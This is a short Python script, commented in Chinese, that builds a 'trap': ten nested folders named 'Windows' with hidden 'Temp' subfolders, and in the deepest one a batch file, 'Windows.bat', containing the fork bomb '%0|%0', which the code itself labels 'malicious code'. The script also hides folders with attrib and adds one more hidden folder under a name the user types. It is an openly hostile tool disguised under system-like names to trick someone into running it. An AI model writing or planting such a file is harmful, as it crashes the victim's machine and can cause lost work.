import os


#选择保存路径
import tkinter as tk
from tkinter import filedialog
root = tk.Tk()
root.withdraw()
path = filedialog.askdirectory()

#定义陷阱路径
url = '{}'.format(path)
url0 = '{}\Windows'.format(path)

#创建陷阱文件夹
for i in range(10):
    url = url + r'\Windows'
    if os.path.exists(url):
        print('名为 Windows 的文件夹已存在，请删除文件夹或更换路径！')
        break
    else:
        os.mkdir(url)
        url0 = url0 + r'\Temp'
        os.mkdir(url0)
        os.system('attrib +h '+url0)
            
        恶意代码 = '%0|%0'
        if i == 9:
            f = open(url + r'\Windows.bat','w')
            f.write(恶意代码)
            f.close()
            print('生成成功！')

def new(路径):
    url1 = path + '\Windows\{}'.format(路径)
    os.mkdir(url1)
    os.system('attrib +h ' + url1)

lj = input()
new(lj)
